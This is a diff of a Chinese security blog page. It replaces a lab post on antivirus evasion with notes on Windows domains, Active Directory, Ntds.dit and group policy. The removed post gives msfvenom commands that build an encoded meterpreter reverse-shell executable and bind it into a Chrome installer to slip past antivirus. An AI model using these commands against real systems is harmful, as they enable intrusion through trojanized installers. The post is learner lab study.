@@ -18,31 +18,26 @@
   <meta name="author" content="recyvan">
   <meta name="keywords" content="">
   
-    <meta name="description" content="免杀基础笔记  免杀基础概念免杀一般指反病毒技术，在一些特定情况下或者实际场景下获得目标靶机后，因存在杀毒软件的检测，所以很多脚本等都无法使用，这是需要一种木马或脚本免于被杀毒软件查杀的技术。 免杀涉及到的内容比较多，基本的免杀多是修改木马内容，改变其特征码，捆绑，加壳，分离等。 免杀感觉更偏向于逆写和二进制（不是全部），对于web安全入门，多使用msf和cs进行免杀测试，之后能力提升后，可以">
+    <meta name="description" content="以前学习时，遇到过在windows7旗舰版非administer和administer账户下的执行或搭建一些web服务会遇到可执行函数无法执行（反馈回来的是得不到回显）。 域当一个工作组中的计算机变多时，域（Domain）便成了一个更好的计算机资源管理模式，在于环境中所有的用户，用户组，计算机，打印机等设备都在一个或多个域控制器的中央数据库中注册，当域用户需要访问域中的资源时，必须通过域控制器">
 <meta property="og:type" content="article">
-<meta property="og:title" content="免杀基础了解笔记">
-<meta property="og:url" content="https://recyvan.github.io/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:title" content="windows域与用户组策略笔记(废弃)">
+<meta property="og:url" content="https://recyvan.github.io/2023/12/21/windows%E5%9F%9F%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84%E7%AD%96%E7%95%A5/index.html">
 <meta property="og:site_name" content="Recyvan">
-<meta property="og:description" content="免杀基础笔记  免杀基础概念免杀一般指反病毒技术，在一些特定情况下或者实际场景下获得目标靶机后，因存在杀毒软件的检测，所以很多脚本等都无法使用，这是需要一种木马或脚本免于被杀毒软件查杀的技术。 免杀涉及到的内容比较多，基本的免杀多是修改木马内容，改变其特征码，捆绑，加壳，分离等。 免杀感觉更偏向于逆写和二进制（不是全部），对于web安全入门，多使用msf和cs进行免杀测试，之后能力提升后，可以">
+<meta property="og:description" content="以前学习时，遇到过在windows7旗舰版非administer和administer账户下的执行或搭建一些web服务会遇到可执行函数无法执行（反馈回来的是得不到回显）。 域当一个工作组中的计算机变多时，域（Domain）便成了一个更好的计算机资源管理模式，在于环境中所有的用户，用户组，计算机，打印机等设备都在一个或多个域控制器的中央数据库中注册，当域用户需要访问域中的资源时，必须通过域控制器">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://recyvan.github.io/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215124624.jpg">
-<meta property="og:image" content="https://recyvan.github.io/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215135040.jpg">
-<meta property="og:image" content="https://recyvan.github.io/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215140146.jpg">
-<meta property="og:image" content="https://recyvan.github.io/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215140722.jpg">
-<meta property="og:image" content="https://recyvan.github.io/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215143025.jpg">
-<meta property="og:image" content="https://recyvan.github.io/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215144014.jpg">
-<meta property="article:published_time" content="2023-12-15T02:16:17.000Z">
-<meta property="article:modified_time" content="2023-12-15T10:11:42.272Z">
+<meta property="og:image" content="https://recyvan.github.io/2023/12/21/windows%E5%9F%9F%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84%E7%AD%96%E7%95%A5/%7B90E274FD-8600-4a95-B846-86E1992A6849%7D.png">
+<meta property="article:published_time" content="2023-12-21T04:46:11.000Z">
+<meta property="article:modified_time" content="2023-12-26T04:52:28.179Z">
 <meta property="article:author" content="recyvan">
-<meta property="article:tag" content="渗透测试，免杀">
+<meta property="article:tag" content="网络安全">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://recyvan.github.io/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215124624.jpg">
+<meta name="twitter:image" content="https://recyvan.github.io/2023/12/21/windows%E5%9F%9F%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84%E7%AD%96%E7%95%A5/%7B90E274FD-8600-4a95-B846-86E1992A6849%7D.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>免杀基础了解笔记 !-! Recyvan</title>
+  <title>windows域与用户组策略笔记(废弃) !-! Recyvan</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -264,7 +259,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="免杀基础了解笔记"></span>
+            <span id="subtitle" data-typed-text="windows域与用户组策略笔记(废弃)"></span>
           
         </div>
 
@@ -275,8 +270,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-12-15 10:16" pubdate>
-          2023年12月15日 上午
+        <time datetime="2023-12-21 12:46" pubdate>
+          2023年12月21日 下午
         </time>
       </span>
     
@@ -287,7 +282,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          1.4k 字
         
       </span>
     
@@ -298,7 +293,7 @@
         
         
         
-          18 分钟
+          12 分钟
         
       </span>
     
@@ -335,93 +330,37 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">免杀基础了解笔记</h1>
+            <h1 id="seo-header">windows域与用户组策略笔记(废弃)</h1>
             
             
               <div class="markdown-body">
                 
                 <hr>
-<p> 免杀基础笔记</p>
 <hr>
-<h3 id="免杀基础概念"><a href="#免杀基础概念" class="headerlink" title="免杀基础概念"></a>免杀基础概念</h3><p>免杀一般指反病毒技术，在一些特定情况下或者实际场景下获得目标靶机后，因存在杀毒软件的检测，所以很多脚本等都无法使用，这是需要一种木马或脚本免于被杀毒软件查杀的技术。</p>
-<p>免杀涉及到的内容比较多，基本的免杀多是修改木马内容，改变其特征码，捆绑，加壳，分离等。</p>
-<p>免杀感觉更偏向于逆写和二进制（不是全部），对于web安全入门，多使用msf和cs进行免杀测试，之后能力提升后，可以自己编写免杀脚本。</p>
-<h3 id="杀毒软件检测方式"><a href="#杀毒软件检测方式" class="headerlink" title="杀毒软件检测方式"></a>杀毒软件检测方式</h3><h4 id="静态查杀"><a href="#静态查杀" class="headerlink" title="静态查杀"></a>静态查杀</h4><p>一般根据特征码识别，对文件进行特征码匹配。将扫描信息与病毒数据库进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码；在病毒样本中，抽取特征代码；抽取的代码比较特殊，不大可能与普通正常程序代码吻合；抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。</p>
-<h4 id="云查杀"><a href="#云查杀" class="headerlink" title="云查杀"></a>云查杀</h4><p>查杀原理是对文件内容和行为的检测</p>
-<h4 id="行为查杀-动态查杀"><a href="#行为查杀-动态查杀" class="headerlink" title="行为查杀&#x2F;动态查杀"></a>行为查杀&#x2F;动态查杀</h4><p>对目标产生的行为进行检测，即对即将执行的指令进行检测</p>
-<h4 id="扫描查杀方式"><a href="#扫描查杀方式" class="headerlink" title="扫描查杀方式"></a>扫描查杀方式</h4><ul>
-<li><p>1、扫描压缩包技术：即是对压缩包案和封装文件作分析检查的技术。</p>
-</li>
-<li><p>2、程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑。</p>
-</li>
-<li><p>3、修复技术：即是对恶意程序所损坏的文件进行还原</p>
-</li>
-<li><p>4、急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒。</p>
-</li>
-<li><p>5、智能扫描：扫描最常用的磁盘，系统关键位置，耗时较短。</p>
-</li>
-<li><p>6、全盘扫描：扫描电脑全部磁盘，耗时较长。</p>
-</li>
-<li><p>7、勒索软件防护：保护电脑中的文件不被黑客恶意加密。</p>
-</li>
-<li><p>8、开机扫描：当电脑开机时自动进行扫描，可以扫描压缩文档和可能不需要的程序</p>
-<h4 id="监控技术"><a href="#监控技术" class="headerlink" title="监控技术"></a>监控技术</h4></li>
-<li><p>内存监控：当内存中注入病毒时，进行删除等操作</p>
-</li>
-<li><p>文件监控：当文件被越权改动，或写入磁盘时存在病毒时进行查杀</p>
-</li>
-<li><p>网页保护：阻止非法网站的窃取和非法文件下载</p>
-<p><strong>其他的还有主动防御技术，机器学习识别技术(人工智能识别技术)，进程行为检测法()沙盒模式，文件校验法等等</strong></p>
-<h3 id="基础免杀于msfvenom工具"><a href="#基础免杀于msfvenom工具" class="headerlink" title="基础免杀于msfvenom工具"></a>基础免杀于msfvenom工具</h3><p>简单免杀多是改变进程名称，图标，文件名称，文件属性，加壳，对木马进行编码，修改源码的特征码，对shellcode进行二次编译，使用免杀生成器，加载器等。</p>
-</li>
-</ul>
-<p>msFvenom是msfpayload和msfencode的组合，msFvenom目前已经无法单独使用绕过免杀。</p>
+<p>以前学习时，遇到过在windows7旗舰版非administer和administer账户下的执行或搭建一些web服务会遇到可执行函数无法执行（反馈回来的是得不到回显）。</p>
+<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>当一个工作组中的计算机变多时，域（Domain）便成了一个更好的计算机资源管理模式，在于环境中所有的用户，用户组，计算机，打印机等设备都在一个或多个域控制器的中央数据库中注册，当域用户需要访问域中的资源时，必须通过域控制器集中进行身份验证。</p>
+<p>域可以分为单域，父域和子域，域树，域林等多种。</p>
+<h4 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h4><p>活动目录（ Active Directory , AD ）是指安装在域控制器上，为整个域环境提供集中式目录管理服务的组件。活动目录存储了有关域环境中各种对象的信息，如域、用户、用户组、计算机、组织单位、共享资源、安全策略等，目录数据存储在域控制器的 Ntds.dit 文件中，活动目录主要提供了以下功能：</p>
 <ul>
-<li><p>-p 指定使用的payload</p>
-</li>
-<li><p>-l 列出指定模块的可用资源：payloads encodes nops all</p>
-</li>
-<li><p>-n 为payload预定一个NOP的滑动长度</p>
-</li>
-<li><p>-f 指定输出格式</p>
-</li>
-<li><p>-e 指定需要的编码格式</p>
-</li>
-<li><p>-a 指定payload的目标架构 x86|x64|x86_64</p>
-</li>
-<li><p>-platform 指定目标平台</p>
-</li>
-<li><p>-s 设置文件大小</p>
-</li>
-<li><p>-i 设置编码次数</p>
-</li>
-<li><p>-o 指定payload存放位置</p>
-<h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4></li>
+<li>计算机集中管理：集中管理所有加入域的服务器及客户端计算机，统一下发组策略。</li>
+<li>用户集中管理：集中管理城用户、组织通讯录、用户组，对用户进行统一的身份认证、资源授权等。</li>
+<li>资源集中管理：集中管理域中的打印机、文件共享服务等网络资源。</li>
+<li>环境集中配置：集中的配置城中计算机的工作环境，如统一计算机桌面、统一网络连接配置，统一计算机安全配置等。</li>
+<li>应用集中管理：对城中的计算机统一推送软件、安全补丁、防病毒系统等。</li>
 </ul>
-<p>kali下执行</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -a x86 -p windows/meterpreter/reverse_tcp  LHOST=192.168.56.128 LPORT=7777 -e x86/shikata_ga_nai -i 30 -b &#x27;\x00&#x27; -f exe -o shell.exe<br></code></pre></td></tr></table></figure>
-
-<p>  该命令是指制作一个windows x86架构的反向shell，其中设置监听主机为ip和port，编码格式下为</p>
-<p><strong>shikat_ga_nai</strong> (不包含\x00字符即空字符)(此处编码了30次)的名为shell.exe的可执行脚本。</p>
-<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215124624.jpg" srcset="/img/loading.gif" lazyload alt="木马生成"></p>
-<p>放到&#x2F;上传到指定系统双击运行即可。(因为安装的360杀毒很久之前就已经可以检测出来了，就不展示了^<del>__</del>^</p>
-<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215135040.jpg" srcset="/img/loading.gif" lazyload alt="木马被360拦截"></p>
-<p>msfvenom进行捆绑软件木马</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -a x86 -p windows/meterpreter/reverse_tcp  LHOST=192.168.65.128 LPORT=7777 -e x86/shikata_ga_nai -i 30 -b &#x27;\x00&#x27; -x setchrome.exe -f exe -o shell.exe<br></code></pre></td></tr></table></figure>
-
-<ul>
-<li>图中ip的65写成了56，唉又重新做了一遍，哭。</li>
-</ul>
-<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215140146.jpg" srcset="/img/loading.gif" lazyload alt="捆绑安装chrome"></p>
-<p>发现360杀毒并未检测出来病毒（360杀毒安装时间为23-12-15日，但过了大约1分钟后被查杀出）（但第二次上传后，未进行扫描，且断开网络后360并未查杀，（个人猜测：感觉是本地库下扫描未检出，但联网后的云检测可以检测出来（个人猜想不一定正确^__^））</p>
-<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215140722.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>下一步开始执行安装程序（下载kali开启监听</p>
-<p>操作时突然发现一个盲点：kali目前只有一个网卡，windows10有两个，但要互ping就要使用VM8网卡，而这个网卡又连着网络，一连网就查杀。无奈再给kali一个网卡vm2，重新走一遍流程。哭，kali默认的atuo lo就只有一个网卡，还得重新静态路由。！！！</p>
-<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215143025.jpg" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215144014.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>重来：</p>
-<p>重新生成-&gt;window10禁止上网-&gt;打开360-&gt;木马查杀-&gt;kali msf监听-&gt;双击运行（对，这一切的一切windows10没开windows defender。）</p>
-<p>额返回值还是为空？？？</p>
+<h4 id="Ntds-dit"><a href="#Ntds-dit" class="headerlink" title="Ntds.dit"></a>Ntds.dit</h4><p>该文件是一个二进制文件，保存在域环境的域控制系统上，是主要的活动目录数据库，该文件包含有关域用户的，用户密码的哈希散列值，用户组，组成员身份和组策略信息，是使用SYSTEM文件中的密钥对这些hash值进行加密。存储位置为域控的(一般情况或绝大情况下) <code>%SystemRoot%\ntds.dit</code></p>
+<p>在通常情况下，即使拥有管理员权限，也无法读取域控中的 ntds.dit 文件（因为活动目录始终访问这个文件，所以文件被禁止读取），它和 SAM 文件一样，是被 Windows 操作系统锁定的。而在<strong>非域环境下，用户的登录凭据等信息储存在本地的SAM文件下</strong>。</p>
+<p>​																																							有关域的内容等学会更多再更新。</p>
+<h3 id="用户组策略"><a href="#用户组策略" class="headerlink" title="用户组策略"></a>用户组策略</h3><hr>
+<p>前置：对于文章开篇问题，简单解决方案：启动administer用户并设置密码，禁用或删除其他管理员账户以解决权限问题（当然对于部分系统内置文件其最高权限也是无法需改，可以进PE启动盘删改（大概</p>
+<p><img src="/2023/12/21/windows%E5%9F%9F%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84%E7%AD%96%E7%95%A5/%7B90E274FD-8600-4a95-B846-86E1992A6849%7D.png" srcset="/img/loading.gif" lazyload alt="原环境为PVE,现环境为VM"></p>
+<hr>
+<h4 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h4><p>访问令牌(Access Tokens)是Windows操作系统安全性的一个概念。当用户登陆时，系统创建一个访问令牌，里面包含登录进程返回的SID和由本地安全策略分配给用户和用户的安全组的特权列表。此后代表该用户执行的每个进程都有此访问令牌的副本，每当线程或进程与安全对象交互或尝试执行需要特权的系统任务时，windows都会使用此令牌标识并确定关联账户。SID用来标识用户账户和该用户所属的组。（关联知识：DACL和SACL）</p>
+<h4 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h4><blockquote>
+<p>组策略（英语：Group Policy）是微软Windows NT家族操作系统的一个特性，它可以控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。组策略的其中一个版本名为本地组策略（缩写“LGPO”或“LocalGPO”），这可以在独立且非域的计算机上管理组策略对象。</p>
+<p>​                                                                                                                 														   –百度百科</p>
+</blockquote>
+<h3 id="影子账户设立"><a href="#影子账户设立" class="headerlink" title="影子账户设立"></a>影子账户设立</h3><p>之前想单独了解用户组和sam文件，但后来和组策略搞混了，只能以后学习了。。。</p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
                 
               </div>
@@ -440,7 +379,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%85%8D%E6%9D%80/" class="category-chain-item">免杀</a>
+  <a href="/categories/windows/" class="category-chain-item">windows</a>
   
   
 
@@ -455,7 +394,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%8C%E5%85%8D%E6%9D%80/" class="print-no-link">#渗透测试，免杀</a>
+        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="print-no-link">#网络安全</a>
       
     </div>
   
@@ -467,8 +406,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>免杀基础了解笔记</div>
-      <div>https://recyvan.github.io/2023/12/15/免杀基础了解笔记/</div>
+      <div>windows域与用户组策略笔记(废弃)</div>
+      <div>https://recyvan.github.io/2023/12/21/windows域与用户组策略/</div>
     </div>
     <div class="license-meta">
       
@@ -480,7 +419,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年12月15日</div>
+          <div>2023年12月21日</div>
         </div>
       
       
@@ -518,9 +457,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/12/21/windows%E5%9F%9F%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84%E7%AD%96%E7%95%A5/" title="windows域与用户组策略笔记(废弃)">
+                      <a href="/2023/12/24/python%E4%B9%8Brequest%E5%BA%93/" title="python之request库">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">windows域与用户组策略笔记(废弃)</span>
+                        <span class="hidden-mobile">python之request库</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -528,8 +467,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/12/14/pingtunnel%E4%B8%8Eicmp%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87/" title="ping-ptunnel与icmp隧道绕过">
-                        <span class="hidden-mobile">ping-ptunnel与icmp隧道绕过</span>
+                      <a href="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/" title="免杀基础了解笔记">
+                        <span class="hidden-mobile">免杀基础了解笔记</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -548,9 +487,9 @@
     <div id="cusdis_thread"
       data-host="https://cusdis.com"
       data-app-id="c2356bee-26d9-49b6-8738-2e2e950fdfeb"
-      data-page-id="27b4bd7552cb857fd3bd3fd9b17b7048"
-      data-page-url="2023/12/15/免杀基础了解笔记/"
-      data-page-title="免杀基础了解笔记"
+      data-page-id="82e0cca6519444561c239506472cc057"
+      data-page-url="2023/12/21/windows域与用户组策略/"
+      data-page-title="windows域与用户组策略笔记(废弃)"
       data-theme="auto"
     >
     </div>
